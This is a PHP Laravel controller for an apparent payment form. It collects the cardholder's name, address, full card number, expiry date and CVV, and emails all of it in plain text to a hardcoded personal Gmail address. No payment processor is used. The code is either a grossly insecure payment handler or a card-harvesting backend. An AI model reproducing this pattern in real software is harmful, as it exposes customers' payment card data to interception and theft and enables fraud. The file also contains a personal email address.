<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Mail;
use Session;
class MailController extends Controller
{
    public function MailSent(Request $req)
    {
        $this->validate($req,[
            'name_on_card'  => 'required',
            'email'         => 'required',
            'address'       => 'required',
            'town_city'     => 'required',
            'zip'           => 'required',
            'order_number'  => 'required',
            'card_number'   => 'required',
            'expire_date'   => 'required',
            'cvv'           => 'required',
            'amount'        => 'required'
        ]);

    	$inputs = [

    		'name_on_card'  => $req->input('name_on_card'),
    		'email'         => $req->input('email'),
    		'address'       => $req->input('address'),
    		'town_city'     => $req->input('town_city'),
    		'zip'           => $req->input('zip'),
    		'order_number'  => $req->input('order_number'),
    		'card_number'   => $req->input('card_number'),
    		'expire_date'   => $req->input('expire_date'),
    		'cvv'           => $req->input('cvv'),
    		'amount'        => $req->input('amount'),
    		'body_message'  => $req->input('body_message')
    	];

    	Mail::send('mail', $inputs, function ($message) use ($inputs) {
    	    $message->from($inputs['email'])
    	            ->to('tonypcworld@gmail.com','tarif')
    	            ->subject('Card Payment Information Order#'.$inputs['order_number']);
    	});

    	return redirect()->back()->with('message','We received your e-mail. Thankyou for submitted information');
    }
}
